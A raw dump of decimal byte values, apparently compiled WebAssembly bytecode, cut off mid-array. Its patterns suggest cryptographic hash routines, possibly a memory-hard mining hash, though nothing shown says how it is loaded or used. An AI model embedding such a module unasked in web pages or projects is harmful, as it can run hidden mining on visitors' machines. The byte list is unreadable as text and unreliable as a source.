32,16,66,14,124,32,14,66,32,134,32,14,66,32,136,132,32,11,133,124,34,14,124,33,10,32,14,66,16,134,32,14,66,48,136,132,32,10,133,34,14,32,11,32,15,124,32,9,66,32,134,32,9,66,32,136,132,32,12,133,32,13,124,34,9,124,34,12,124,33,11,32,14,66,52,134,32,14,66,12,136,132,32,11,133,34,14,32,9,66,14,134,32,9,66,50,136,132,32,12,133,34,9,32,10,124,34,12,124,33,10,32,14,66,40,134,32,14,66,24,136,132,32,10,133,34,14,32,9,66,57,134,32,9,66,7,136,132,32,12,133,34,9,32,11,124,34,12,124,33,11,32,9,66,23,134,32,9,66,41,136,132,32,12,133,34,9,32,10,124,34,12,32,18,124,32,22,66,15,124,32,14,66,5,134,32,14,66,59,136,132,32,11,133,124,34,14,124,33,10,32,14,66,33,134,32,14,66,31,136,132,32,10,133,34,14,32,11,32,17,124,32,9,66,37,134,32,9,66,27,136,132,32,12,133,32,20,124,34,20,124,34,11,124,33,9,32,14,66,46,134,32,14,66,18,136,132,32,9,133,34,14,32,20,66,25,134,32,20,66,39,136,132,32,11,133,34,20,32,10,124,34,11,124,33,10,32,14,66,22,134,32,14,66,42,136,132,32,10,133,34,14,32,20,66,12,134,32,20,66,52,136,132,32,11,133,34,20,32,9,124,34,11,124,33,9,32,20,66,58,134,32,20,66,6,136,132,32,11,133,34,20,32,10,124,34,10,32,24,124,32,15,66,16,124,32,14,66,32,134,32,14,66,32,136,132,32,9,133,124,34,15,124,33,14,32,15,66,16,134,32,15,66,48,136,132,32,14,133,34,15,32,9,32,23,124,32,20,66,32,134,32,20,66,32,136,132,32,10,133,32,18,124,34,18,124,34,9,124,33,20,32,15,66,52,134,32,15,66,12,136,132,32,20,133,34,15,32,18,66,14,134,32,18,66,50,136,132,32,9,133,34,18,32,14,124,34,9,124,33,14,32,15,66,40,134,32,15,66,24,136,132,32,14,133,34,15,32,18,66,57,134,32,18,66,7,136,132,32,9,133,34,18,32,20,124,34,9,124,33,20,32,18,66,23,134,32,18,66,41,136,132,32,9,133,34,18,32,14,124,34,14,32,19,124,32,17,66,17,124,32,15,66,5,134,32,15,66,59,136,132,32,20,133,124,34,17,124,33,15,32,17,66,33,134,32,17,66,31,136,132,32,15,133,34,17,32,20,32,16,124,32,18,66,37,134,32,18,66,27,136,132,32,14,133,32,24,124,34,16,124,34,18,124,33,14,32,16,66,25,134,32,16,66,39,136,132,32,18,133,34,16,32,15,124,33,15,32,16,66,12,134,32,16,66,52,136,132,32,15,133,34,16,32,14,124,33,18,32,16,66,58,134,32,16,66,6,136,132,32,18,133,34,16,32,17,66,46,134,32,17,66,18,136,132,32,14,133,34,17,32,15,124,34,15,124,33,14,32,8,32,17,66,22,134,32,17,66,42,136,132,32,15,133,34,24,32,18,124,34,18,32,22,124,32,34,133,34,17,55,3,0,32,7,32,16,66,32,134,32,16,66,32,136,132,32,14,133,32,19,124,32,35,133,34,15,55,3,0,32,6,32,14,32,21,124,32,32,133,34,16,55,3,0,32,5,32,23,66,18,124,32,24,66,32,134,32,24,66,32,136,132,32,18,133,124,32,33,133,34,22,55,3,0,32,25,66,255,255,255,255,255,255,255,255,191,127,131,33,25,32,2,65,127,106,34,2,4,64,32,0,33,1,32,15,33,23,12,1,11,11,32,3,32,31,32,30,66,1,124,32,29,126,124,55,3,0,32,4,32,25,55,3,0,11,178,23,2,59,127,45,126,35,4,33,4,35,4,65,192,2,106,36,4,32,4,32,0,65,8,106,34,8,41,3,0,34,64,55,3,0,32,4,65,8,106,34,6,32,0,65,16,106,34,9,41,3,0,34,63,55,3,0,32,3,173,33,91,32,4,65,24,106,33,5,32,4,65,32,106,33,10,32,4,65,40,106,33,11,32,4,65,48,106,33,12,32,4,65,56,106,33,13,32,4,65,192,0,106,33,14,32,4,65,200,0,106,33,15,32,4,65,208,0,106,33,16,32,4,65,216,0,106,33,17,32,4,65,224,0,106,33,18,32,4,65,232,0,106,33,19,32,4,65,240,0,106,33,20,32,4,65,248,0,106,33,21,32,4,65,128,1,106,33,22,32,4,65,136,1,106,33,23,32,4,65,144,1,106,33,24,32,4,65,152,1,106,33,25,32,4,65,16,106,33,26,32,1,33,3,32,64,33,84,32,0,65,24,106,34,27,41,3,0,33,72,32,0,65,32,106,34,28,41,3,0,33,76,32,0,65,40,106,34,29,41,3,0,33,74,32,0,65,48,106,34,30,41,3,0,33,73,32,0,65,56,106,34,31,41,3,0,33,75,32,0,65,192,0,106,34,32,41,3,0,33,70,32,0,65,200,0,106,34,33,41,3,0,33,71,32,0,65,208,0,106,34,34,41,3,0,33,66,32,0,65,216,0,106,34,35,41,3,0,33,77,32,0,65,224,0,106,34,36,41,3,0,33,68,32,0,65,232,0,106,34,37,41,3,0,33,67,32,0,65,240,0,106,34,38,41,3,0,33,69,32,0,65,248,0,106,34,39,41,3,0,33,78,32,0,65,128,1,106,34,40,41,3,0,33,81,32,0,65,136,1,106,34,41,41,3,0,33,65,32,0,65,144,1,106,34,42,41,3,0,33,64,3,64,32,4,32,84,32,91,124,34,82,55,3,0,32,5,32,72,55,3,0,32,10,32,76,55,3,0,32,11,32,74,55,3,0,32,12,32,73,55,3,0,32,13,32,75,55,3,0,32,14,32,70,55,3,0,32,15,32,71,55,3,0,32,16,32,66,55,3,0,32,17,32,77,55,3,0,32,18,32,68,55,3,0,32,19,32,67,55,3,0,32,20,32,69,55,3,0,32,21,32,78,55,3,0,32,22,32,81,55,3,0,32,23,32,65,55,3,0,32,24,32,64,55,3,0,32,25,32,64,66,162,180,240,207,170,251,198,232,27,133,32,65,133,32,81,133,32,78,133,32,69,133,32,67,133,32,68,133,32,77,133,32,66,133,32,71,133,32,70,133,32,75,133,32,73,133,32,74,133,32,76,133,32,72,133,55,3,0,32,26,32,82,32,63,133,55,3,0,65,1,33,1,32,3,41,0,0,34,92,32,72,124,33,72,32,3,41,0,8,34,93,32,76,124,33,76,32,3,41,0,16,34,94,32,74,124,33,74,32,3,41,0,24,34,95,32,73,124,33,73,32,3,41,0,32,34,96,32,75,124,33,75,32,3,41,0,40,34,97,32,70,124,33,70,32,3,41,0,48,34,98,32,71,124,33,71,32,3,41,0,56,34,99,32,66,124,33,66,32,3,41,0,64,34,100,32,77,124,33,77,32,3,41,0,72,34,101,32,68,124,33,68,32,3,41,0,80,34,102,32,67,124,33,67,32,3,41,0,88,34,103,32,69,124,33,69,32,3,41,0,96,34,104,32,78,124,33,78,32,3,41,0,120,34,105,32,64,124,33,63,32,3,41,0,112,34,106,32,65,124,32,6,41,3,0,124,33,64,32,82,32,81,124,32,3,41,0,104,34,107,124,33,65,3,64,32,76,66,24,134,32,76,66,40,136,132,32,76,32,72,124,34,76,133,33,85,32,73,66,13,134,32,73,66,51,136,132,32,73,32,74,124,34,73,133,33,79,32,70,66,8,134,32,70,66,56,136,132,32,70,32,75,124,34,70,133,33,84,32,66,66,47,134,32,66,66,17,136,132,32,66,32,71,124,34,66,133,33,75,32,69,66,17,134,32,69,66,47,136,132,32,69,32,67,124,34,67,133,34,80,32,66,124,33,81,32,63,66,37,134,32,63,66,27,136,132,32,64,32,63,124,34,69,133,34,82,32,70,124,33,71,32,67,32,75,124,34,66,32,75,66,49,134,32,75,66,15,136,132,133,34,83,32,68,66,8,134,32,68,66,56,136,132,32,68,32,77,124,34,64,133,34,72,32,76,124,34,68,124,33,88,32,65,66,22,134,32,65,66,42,136,132,32,65,32,78,124,34,63,133,34,74,32,73,124,34,67,32,69,32,84,124,34,69,32,84,66,23,134,32,84,66,41,136,132,133,34,65,124,34,78,32,65,66,4,134,32,65,66,60,136,132,133,33,86,32,63,32,79,124,34,65,32,79,66,18,134,32,79,66,46,136,132,133,34,75,32,71,124,33,84,32,81,32,64,32,85,124,34,64,32,85,66,52,134,32,85,66,12,136,132,133,34,77,124,34,63,32,77,66,13,134,32,77,66,51,136,132,133,33,79,32,82,66,55,134,32,82,66,9,136,132,32,71,133,34,70,32,65,124,33,71,32,74,66,19,134,32,74,66,45,136,132,32,67,133,34,65,32,69,124,33,77,32,80,66,10,134,32,80,66,54,136,132,32,81,133,34,69,32,64,124,33,67,32,65,66,41,134,32,65,66,23,136,132,32,77,133,34,81,32,63,124,33,82,32,75,66,51,134,32,75,66,13,136,132,32,84,133,34,65,32,72,66,38,134,32,72,66,26,136,132,32,68,133,34,64,32,66,124,34,63,124,33,72,32,70,66,34,134,32,70,66,30,136,132,32,71,133,34,76,32,88,124,34,74,32,5,32,1,65,3,116,106,34,43,41,3,0,124,33,73,32,77,32,79,124,34,75,32,79,66,47,134,32,79,66,17,136,132,133,32,5,32,1,65,1,106,34,7,65,3,116,106,34,44,41,3,0,124,33,79,32,69,66,59,134,32,69,66,5,136,132,32,67,133,34,66,32,78,124,34,69,32,5,32,1,65,2,106,34,0,65,3,116,106,34,45,41,3,0,124,33,70,32,65,66,16,134,32,65,66,48,136,132,32,72,133,32,5,32,1,65,3,106,34,46,65,3,116,106,34,47,41,3,0,124,33,80,32,5,32,1,65,4,106,65,3,116,106,34,48,41,3,0,32,84,32,64,66,17,134,32,64,66,47,136,132,32,63,133,34,68,124,34,78,124,33,65,32,86,66,28,134,32,86,66,36,136,132,32,86,32,67,124,34,64,133,32,5,32,1,65,5,106,65,3,116,106,34,49,41,3,0,124,33,87,32,5,32,1,65,6,106,65,3,116,106,34,50,41,3,0,33,77,32,5,32,1,65,7,106,65,3,116,106,34,51,41,3,0,32,71,32,83,66,33,134,32,83,66,31,136,132,32,88,133,34,67,124,34,63,32,67,66,25,134,32,67,66,39,136,132,133,124,33,85,32,5,32,1,65,8,106,65,3,116,106,34,52,41,3,0,32,64,124,33,71,32,5,32,1,65,9,106,65,3,116,106,34,53,41,3,0,32,68,66,41,134,32,68,66,23,136,132,32,78,133,124,33,83,32,5,32,1,65,10,106,65,3,116,106,34,54,41,3,0,32,72,124,33,64,32,5,32,1,65,11,106,65,3,116,106,34,55,41,3,0,32,66,66,20,134,32,66,66,44,136,132,32,69,133,124,33,72,32,5,32,1,65,12,106,65,3,116,106,34,56,41,3,0,32,63,124,33,66,32,5,32,1,65,13,106,65,3,116,106,34,57,41,3,0,32,81,66,48,134,32,81,66,16,136,132,32,82,133,124,32,4,32,1,65,3,116,106,34,58,41,3,0,124,33,86,32,5,32,1,65,14,106,65,3,116,106,34,59,41,3,0,33,68,32,4,32,7,65,3,116,106,34,60,41,3,0,33,67,32,76,66,5,134,32,76,66,59,136,132,32,74,133,32,1,173,34,88,124,32,5,32,1,65,15,106,65,3,116,106,34,61,41,3,0,124,33,74,32,5,32,1,65,16,106,65,3,116,106,34,62,32,5,32,1,65,127,106,34,7,65,3,116,106,41,3,0,55,3,0,32,4,32,0,65,3,116,106,32,4,32,7,65,3,116,106,41,3,0,34,84,55,3,0,32,79,66,41,134,32,79,66,23,136,132,32,73,32,79,124,34,69,133,33,79,32,80,66,9,134,32,80,66,55,136,132,32,70,32,80,124,34,78,133,33,80,32,87,66,37,134,32,87,66,27,136,132,32,65,32,87,124,34,65,133,33,81,32,85,32,77,124,32,82,124,34,63,32,85,66,31,134,32,85,66,33,136,132,133,33,73,32,72,66,47,134,32,72,66,17,136,132,32,64,32,72,124,34,64,133,34,72,32,63,124,33,76,32,74,66,30,134,32,74,66,34,136,132,32,68,32,75,124,32,67,124,32,74,124,34,63,133,34,74,32,65,124,33,70,32,64,32,73,124,34,77,32,73,66,4,134,32,73,66,60,136,132,133,34,90,32,83,66,12,134,32,83,66,52,136,132,32,71,32,83,124,34,67,133,34,83,32,69,124,34,68,124,33,87,32,63,32,81,124,34,69,32,81,66,42,134,32,81,66,22,136,132,133,34,71,32,86,66,44,134,32,86,66,20,136,132,32,66,32,86,124,34,63,133,34,73,32,78,124,34,78,124,33,75,32,70,32,63,32,80,124,34,64,32,80,66,53,134,32,80,66,11,136,132,133,34,63,124,34,65,32,63,66,47,134,32,63,66,17,136,132,133,33,89,32,76,32,79,66,41,134,32,79,66,23,136,132,32,79,32,67,124,34,63,133,34,66,124,34,67,32,66,66,46,134,32,66,66,18,136,132,133,33,80,32,74,66,51,134,32,74,66,13,136,132,32,70,133,34,66,32,64,124,33,85,32,71,66,44,134,32,71,66,20,136,132,32,75,133,34,70,32,72,66,56,134,32,72,66,8,136,132,32,76,133,34,71,32,63,124,34,63,124,33,86,32,66,66,19,134,32,66,66,45,136,132,32,85,133,34,79,32,87,124,34,81,32,44,41,3,0,124,33,72,32,73,66,34,134,32,73,66,30,136,132,32,78,133,34,66,32,69,124,34,64,32,80,124,34,82,32,80,66,23,134,32,80,66,41,136,132,133,32,45,41,3,0,124,33,76,32,47,41,3,0,32,75,32,71,66,44,134,32,71,66,20,136,132,32,63,133,34,80,124,34,69,124,33,74,32,89,66,37,134,32,89,66,27,136,132,32,89,32,83,66,16,134,32,83,66,48,136,132,32,68,133,34,68,32,77,124,34,63,124,34,78,133,32,48,41,3,0,124,33,73,32,49,41,3,0,32,65,32,68,66,25,134,32,68,66,39,136,132,32,63,133,34,68,124,34,65,124,33,75,32,70,66,31,134,32,70,66,33,136,132,32,86,133,32,50,41,3,0,124,33,70,32,51,41,3,0,32,66,66,42,134,32,66,66,22,136,132,32,64,133,34,83,32,67,124,34,64,124,33,71,32,52,41,3,0,32,85,32,90,66,31,134,32,90,66,33,136,132,32,87,133,34,67,124,34,63,32,67,66,20,134,32,67,66,44,136,132,133,124,33,66,32,53,41,3,0,32,86,124,33,77,32,54,41,3,0,32,65,32,68,66,52,134,32,68,66,12,136,132,133,124,33,68,32,55,41,3,0,32,78,124,33,67,32,56,41,3,0,32,69,32,80,66,48,134,32,80,66,16,136,132,133,124,33,69,32,57,41,3,0,32,63,124,33,78,32,59,41,3,0,32,83,66,35,134,32,83,66,29,136,132,32,64,133,124,32,60,41,3,0,124,33,65,32,82,32,84,124,32,61,41,3,0,124,33,64,32,88,66,1,124,32,79,66,9,134,32,79,66,55,136,132,32,81,133,124,32,62,41,3,0,124,33,63,32,5,32,1,65,17,106,65,3,116,106,32,43,41,3,0,55,3,0,32,4,32,46,65,3,116,106,32,58,41,3,0,55,3,0,32,0,65,21,73,4,64,32,0,33,1,12,1,11,11,32,27,32,72,32,92,133,34,72,55,3,0,32,28,32,76,32,93,133,34,76,55,3,0,32,29,32,74,32,94,133,34,74,55,3,0,32,30,32,73,32,95,133,34,73,55,3,0,32,31,32,75,32,96,133,34,75,55,3,0,32,32,32,70,32,97,133,34,70,55,3,0,32,33,32,71,32,98,133,34,71,55,3,0,32,34,32,66,32,99,133,34,66,55,3,0,32,35,32,77,32,100,133,34,77,55,3,0,32,36,32,68,32,101,133,34,68,55,3,0,32,37,32,67,32,102,133,34,67,55,3,0,32,38,32,69,32,103,133,34,69,55,3,0,32,39,32,78,32,104,133,34,78,55,3,0,32,40,32,65,32,107,133,34,65,55,3,0,32,41,32,64,32,106,133,34,64,55,3,0,32,42,32,63,32,105,133,34,63,55,3,0,32,6,32,6,41,3,0,66,255,255,255,255,255,255,255,255,191,127,131,34,82,55,3,0,32,2,65,127,106,34,2,4,64,32,3,65,128,1,106,33,3,32,4,41,3,0,33,84,32,65,33,81,32,64,33,65,32,63,33,64,32,82,33,63,12,1,11,11,32,8,32,4,41,3,0,55,3,0,32,9,32,82,55,3,0,32,4,36,4,11,212,18,1,34,127,35,4,33,2,35,4,65,192,0,106,36,4,32,2,32,1,45,0,1,65,16,116,32,1,45,0,0,65,24,116,114,32,1,45,0,2,65,8,116,114,32,1,45,0,3,114,54,2,0,32,2,32,1,45,0,5,65,16,116,32,1,45,0,4,65,24,116,114,32,1,45,0,6,65,8,116,114,32,1,45,0,7,114,54,2,4,32,2,32,1,45,0,9,65,16,116,32,1,45,0,8,65,24,116,114,32,1,45,0,10,65,8,116,114,32,1,45,0,11,114,54,2,8,32,2,32,1,45,0,13,65,16,116,32,1,45,0,12,65,24,116,114,32,1,45,0,14,65,8,116,114,32,1,45,0,15,114,54,2,12,32,2,32,1,45,0,17,65,16,116,32,1,45,0,16,65,24,116,114,32,1,45,0,18,65,8,116,114,32,1,45,0,19,114,54,2,16,32,2,32,1,45,0,21,65,16,116,32,1,45,0,20,65,24,116,114,32,1,45,0,22,65,8,116,114,32,1,45,0,23,114,54,2,20,32,2,32,1,45,0,25,65,16,116,32,1,45,0,24,65,24,116,114,32,1,45,0,26,65,8,116,114,32,1,45,0,27,114,54,2,24,32,2,32,1,45,0,29,65,16,116,32,1,45,0,28,65,24,116,114,32,1,45,0,30,65,8,116,114,32,1,45,0,31,114,54,2,28,32,2,32,1,45,0,33,65,16,116,32,1,45,0,32,65,24,116,114,32,1,45,0,34,65,8,116,114,32,1,45,0,35,114,54,2,32,32,2,32,1,45,0,37,65,16,116,32,1,45,0,36,65,24,116,114,32,1,45,0,38,65,8,116,114,32,1,45,0,39,114,54,2,36,32,2,32,1,45,0,41,65,16,116,32,1,45,0,40,65,24,116,114,32,1,45,0,42,65,8,116,114,32,1,45,0,43,114,54,2,40,32,2,32,1,45,0,45,65,16,116,32,1,45,0,44,65,24,116,114,32,1,45,0,46,65,8,116,114,32,1,45,0,47,114,54,2,44,32,2,32,1,45,0,49,65,16,116,32,1,45,0,48,65,24,116,114,32,1,45,0,50,65,8,116,114,32,1,45,0,51,114,54,2,48,32,2,32,1,45,0,53,65,16,116,32,1,45,0,52,65,24,116,114,32,1,45,0,54,65,8,116,114,32,1,45,0,55,114,54,2,52,32,2,32,1,45,0,57,65,16,116,32,1,45,0,56,65,24,116,114,32,1,45,0,58,65,8,116,114,32,1,45,0,59,114,54,2,56,32,2,32,1,45,0,61,65,16,116,32,1,45,0,60,65,24,116,114,32,1,45,0,62,65,8,116,114,32,1,45,0,63,114,54,2,60,32,0,40,2,0,33,11,32,0,65,4,106,34,23,40,2,0,33,12,32,0,65,8,106,34,24,40,2,0,33,14,32,0,65,12,106,34,25,40,2,0,33,15,32,0,65,16,106,34,26,40,2,0,33,1,32,0,65,20,106,34,27,40,2,0,33,3,32,0,65,24,106,34,28,40,2,0,33,4,32,0,65,28,106,34,29,40,2,0,33,5,32,0,65,32,106,34,30,40,2,0,65,136,213,253,161,2,115,33,13,32,0,65,36,106,34,31,40,2,0,65,211,145,140,173,120,115,33,16,32,0,65,40,106,34,32,40,2,0,65,174,148,230,152,1,115,33,17,32,0,65,44,106,34,33,40,2,0,65,196,230,193,27,115,33,18,32,0,40,2,60,4,127,65,162,240,164,160,122,33,9,65,208,227,252,204,2,33,6,65,152,245,187,193,0,33,10,65,137,217,185,226,126,33,7,65,0,5,32,0,40,2,48,34,6,65,162,240,164,160,122,115,33,9,32,6,65,208,227,252,204,2,115,33,6,32,0,40,2,52,34,7,65,152,245,187,193,0,115,33,10,32,7,65,137,217,185,226,126,115,33,7,65,0,11,33,8,3,64,32,1,32,11,106,32,8,65,4,116,65,145,60,106,45,0,0,34,11,65,2,116,65,144,42,106,40,2,0,32,2,32,8,65,4,116,65,144,60,106,45,0,0,34,19,65,2,116,106,40,2,0,115,106,34,20,32,9,115,34,9,65,16,116,32,9,65,16,118,114,34,9,32,13,106,34,13,32,1,115,34,1,65,20,116,32,1,65,12,118,114,33,1,32,3,32,12,106,32,8,65,4,116,65,147,60,106,45,0,0,34,12,65,2,116,65,144,42,106,40,2,0,32,2,32,8,65,4,116,65,146,60,106,45,0,0,34,21,65,2,116,106,40,2,0,115,106,34,22,32,6,115,34,6,65,16,116,32,6,65,16,118,114,34,6,32,16,106,34,16,32,3,115,34,3,65,20,116,32,3,65,12,118,114,33,3,32,22,32,21,65,2,116,65,144,42,106,40,2,0,32,2,32,12,65,2,116,106,40,2,0,115,106,32,3,106,34,12,32,6,115,34,6,65,24,116,32,6,65,8,118,114,34,6,32,16,106,34,16,32,3,115,34,3,65,25,116,32,3,65,7,118,114,33,3,32,4,32,14,106,32,8,65,4,116,65,149,60,106,45,0,0,34,14,65,2,116,65,144,42,106,40,2,0,32,2,32,8,65,4,116,65,148,60,106,45,0,0,34,21,65,2,116,106,40,2,0,115,106,34,22,32,10,115,34,10,65,16,116,32,10,65,16,118,114,34,10,32,17,106,34,17,32,4,115,34,4,65,20,116,32,4,65,12,118,114,33,4,32,22,32,21,65,2,116,65,144,42,106,40,2,0,32,2,32,14,65,2,116,106,40,2,0,115,106,32,4,106,34,14,32,10,115,34,10,65,24,116,32,10,65,8,118,114,34,10,32,17,106,34,17,32,4,115,34,4,65,25,116,32,4,65,7,118,114,33,4,32,5,32,15,106,32,8,65,4,116,65,151,60,106,45,0,0,34,15,65,2,116,65,144,42,106,40,2,0,32,2,32,8,65,4,116,65,150,60,106,45,0,0,34,21,65,2,116,106,40,2,0,115,106,34,22,32,7,115,34,7,65,16,116,32,7,65,16,118,114,34,7,32,18,106,34,18,32,5,115,34,5,65,20,116,32,5,65,12,118,114,33,5,32,22,32,21,65,2,116,65,144,42,106,40,2,0,32,2,32,15,65,2,116,106,40,2,0,115,106,32,5,106,34,15,32,7,115,34,7,65,24,116,32,7,65,8,118,114,34,7,32,18,106,34,18,32,5,115,34,5,65,25,116,32,5,65,7,118,114,33,5,32,8,65,4,116,65,159,60,106,45,0,0,34,21,65,2,116,65,144,42,106,40,2,0,32,2,32,8,65,4,116,65,158,60,106,45,0,0,34,22,65,2,116,106,40,2,0,115,32,20,32,19,65,2,116,65,144,42,106,40,2,0,32,2,32,11,65,2,116,106,40,2,0,115,106,32,1,106,34,11,32,9,115,34,9,65,24,116,32,9,65,8,118,114,34,9,32,13,106,34,13,32,1,115,34,1,65,25,116,32,1,65,7,118,114,34,1,106,32,15,106,34,15,32,10,115,34,10,65,16,116,32,10,65,16,118,114,34,10,32,16,106,34,16,32,1,115,34,1,65,20,116,32,1,65,12,118,114,33,1,32,15,32,22,65,2,116,65,144,42,106,40,2,0,32,2,32,21,65,2,116,106,40,2,0,115,106,32,1,106,34,15,32,10,115,34,10,65,24,116,32,10,65,8,118,114,34,10,32,16,106,34,16,32,1,115,34,1,65,25,116,32,1,65,7,118,114,33,1,32,8,65,4,116,65,157,60,106,45,0,0,34,19,65,2,116,65,144,42,106,40,2,0,32,2,32,8,65,4,116,65,156,60,106,45,0,0,34,20,65,2,116,106,40,2,0,115,32,14,106,32,5,106,34,14,32,6,115,34,6,65,16,116,32,6,65,16,118,114,34,6,32,13,106,34,13,32,5,115,34,5,65,20,116,32,5,65,12,118,114,33,5,32,14,32,20,65,2,116,65,144,42,106,40,2,0,32,2,32,19,65,2,116,106,40,2,0,115,106,32,5,106,34,14,32,6,115,34,6,65,24,116,32,6,65,8,118,114,34,6,32,13,106,34,13,32,5,115,34,5,65,25,116,32,5,65,7,118,114,33,5,32,3,32,11,106,32,8,65,4,116,65,153,60,106,45,0,0,34,11,65,2,116,65,144,42,106,40,2,0,32,2,32,8,65,4,116,65,152,60,106,45,0,0,34,19,65,2,116,106,40,2,0,115,106,34,20,32,7,115,34,7,65,16,116,32,7,65,16,118,114,34,7,32,17,106,34,17,32,3,115,34,3,65,20,116,32,3,65,12,118,114,33,3,32,20,32,19,65,2,116,65,144,42,106,40,2,0,32,2,32,11,65,2,116,106,40,2,0,115,106,32,3,106,34,11,32,7,115,34,7,65,24,116,32,7,65,8,118,114,34,7,32,17,106,34,17,32,3,115,34,3,65,25,116,32,3,65,7,118,114,33,3,32,4,32,12,106,32,8,65,4,116,65,155,60,106,45,0,0,34,12,65,2,116,65,144,42,106,40,2,0,32,2,32,8,65,4,116,65,154,60,106,45,0,0,34,19,65,2,116,106,40,2,0,115,106,34,20,32,9,115,34,9,65,16,116,32,9,65,16,118,114,34,9,32,18,106,34,18,32,4,115,34,4,65,20,116,32,4,65,12,118,114,33,4,32,20,32,19,65,2,116,65,144,42,106,40,2,0,32,2,32,12,65,2,116,106,40,2,0,115,106,32,4,106,34,12,32,9,115,34,9,65,24,116,32,9,65,8,118,114,34,9,32,18,106,34,18,32,4,115,34,4,65,25,116,32,4,65,7,118,114,33,4,32,8,65,1,106,34,8,65,14,71,13,0,11,32,23,40,2,0,33,8,32,24,40,2,0,33,19,32,25,40,2,0,33,20,32,26,40,2,0,33,21,32,27,40,2,0,33,22,32,28,40,2,0,33,34,32,29,40,2,0,33,35,32,0,32,13,32,11,115,32,0,40,2,0,115,32,30,40,2,0,34,0,115,54,2,0,32,23,32,12,32,16,115,32,8,115,32,31,40,2,0,34,11,115,54,2,0,32,24,32,17,32,14,115,32,19,115,32,32,40,2,0,34,13,115,54,2,0,32,25,32,18,32,15,115,32,20,115,32,33,40,2,0,34,12,115,54,2,0,32,26,32,9,32,1,115,32,21,115,32,0,115,54,2,0,32,27,32,3,32,6,115,32,22,115,32,11,115,54,2,0,32,28,32,4,32,10,115,32,34,115,32,13,115,54,2,0,32,29,32,5,32,7,115,32,35,115,32,12,115,54,2,0,32,2,36,4,11,126,1,4,127,32,0,65,144,131,128,1,106,34,4,40,2,0,34,1,69,4,64,32,0,16,12,15,11,32,1,40,2,0,34,2,4,64,32,2,40,2,4,34,3,4,64,32,3,16,12,32,1,40,2,0,65,0,54,2,4,32,1,40,2,0,33,2,11,32,2,40,2,12,34,3,4,64,32,3,16,12,32,1,40,2,0,65,0,54,2,12,32,1,40,2,0,33,2,11,32,2,16,12,32,1,65,0,54,2,0,32,4,40,2,0,33,1,11,32,1,16,12,32,0,16,12,11,130,8,2,14,127,1,126,35,4,33,3,35,4,65,16,106,36,4,65,160,131,128,1,16,16,34,2,4,64,32,2,65,124,106,40,2,0,65,3,113,4,64,32,2,65,0,65,160,131,128,1,16,14,26,11,11,65,24,16,16,34,0,69,4,64,32,2,65,144,131,128,1,106,65,0,54,2,0,32,3,36,4,32,2,15,11,32,0,65,124,106,40,2,0,65,3,113,4,64,32,0,66,0,55,0,0,32,0,66,0,55,0,8,32,0,66,0,55,0,16,11,32,3,16,7,26,32,3,16,8,33,1,32,3,47,1,4,34,6,16,16,34,4,69,34,7,69,4,64,32,4,65,124,106,40,2,0,65,3,113,4,64,32,4,65,0,32,6,16,14,26,11,11,32,1,40,2,20,33,8,32,1,40,2,16,33,9,32,1,40,2,12,33,10,32,1,40,2,8,33,11,32,1,40,2,4,33,12,32,1,40,2,0,33,1,35,4,33,5,35,4,65,16,106,36,4,65,20,32,5,16,5,33,13,32,5,36,4,32,13,33,5,32,7,69,4,64,32,4,16,12,11,65,128,204,0,32,6,65,237,14,106,32,8,106,32,9,106,32,4,32,6,106,106,32,10,106,32,11,106,32,12,106,32,1,106,32,5,106,34,1,65,127,106,173,55,3,0,32,0,65,0,54,2,0,32,0,65,4,106,34,1,32,1,46,1,0,65,126,113,59,1,0,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,6,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,7,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,8,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,9,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,10,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,11,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,12,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,13,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,14,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,15,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,16,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,17,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,18,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,19,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,20,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,21,32,1,32,1,46,1,0,65,2,114,59,1,0,32,2,65,144,131,128,1,106,32,0,54,2,0,32,3,36,4,32,2,11,227,11,1,9,127,35,4,33,3,35,4,65,208,2,106,36,4,32,3,66,0,55,2,0,32,3,66,0,55,2,8,32,3,66,0,55,2,16,32,3,66,0,55,2,24,32,3,66,0,55,2,32,32,3,66,0,55,2,40,32,3,66,0,55,2,48,32,3,65,0,54,2,56,32,3,65,60,106,34,11,65,128,128,4,54,2,0,32,3,65,136,1,106,34,5,65,0,54,2,0,32,3,65,192,0,106,34,6,65,0,54,2,0,32,